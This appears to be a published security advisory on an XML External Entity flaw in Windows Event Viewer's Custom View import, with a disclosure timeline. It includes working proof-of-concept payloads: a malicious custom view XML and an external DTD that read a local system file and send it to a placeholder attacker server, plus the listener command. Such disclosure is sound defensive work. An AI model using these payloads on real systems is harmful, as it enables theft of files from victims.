@@ -1,0 +1,126 @@
+[+] Credits: John Page aka hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source: http://hyp3rlinx.altervista.org/advisories/MICROSOFT-EVENT-VIEWER-XXE-FILE-EXFILTRATION.txt
+
+[+] ISR: ApparitionSec
+
+
+
+Vendor:
+=================
+www.microsoft.com
+
+
+
+Product:
+========================
+Microsoft Event Viewer
+Version: 1.0
+
+The Windows Event Viewer shows a log of application and system messages –
+errors, information messages, and warnings.
+
+
+Vulnerability Type:
+===================
+XML External Entity
+
+
+
+CVE Reference:
+==============
+N/A
+
+
+
+Vulnerability Details:
+=====================
+
+Windows Event Viewer user can import 'Custom View' files, these files
+contain XML, the parser processes External Entity potentially allowing
+attackers
+to gain remote file access to files on a victims system if user imports a
+corrupt XML file via remote share/USB (or other untrusted source).
+
+
+
+Tested Windows 7 SP1
+
+
+Exploit code(s):
+===============
+
+
+1) Go to Windows CL type 'eventvwr' to bring up Windows Event Viewer.
+2) Action / Import Custom View
+3) Import the malicious 'MyCustomView.xml' via remote share or USB for POC
+4) Files are accessed and sent to remote server.
+
+User gets error like "The specified custom view is not valid" attacker gets
+files!
+
+
+
+"payload.dtd" (host on attacker server)
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker-server:8080?%file;'>">
+%all;
+
+
+"MyCustomView.xml"  (malicious windows Event Custom View XML)
+
+<?xml version="1.0"?>
+<!DOCTYPE APPARITION [
+<!ENTITY % file SYSTEM "C:\Windows\system.ini">
+<!ENTITY % dtd SYSTEM "http://attacker-server:8080/payload.dtd">
+%dtd;]>
+<pwn>&send;</pwn>
+
+
+Attacker server listener
+
+python -m SimpleHTTPServer 8080
+
+
+
+
+Disclosure Timeline:
+=====================================
+Vendor Notification: August 30, 2016
+Vendor reply: "does not meet the bar for security servicing." August 30,
+2016
+December 4, 2016 : Public Disclosure
+
+
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+
+Severity Level:
+================
+High
+
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no
+warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the
+information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author
+prohibits any malicious use of security related information
+or exploits by the author or elsewhere.
+
+hyp3rlinx
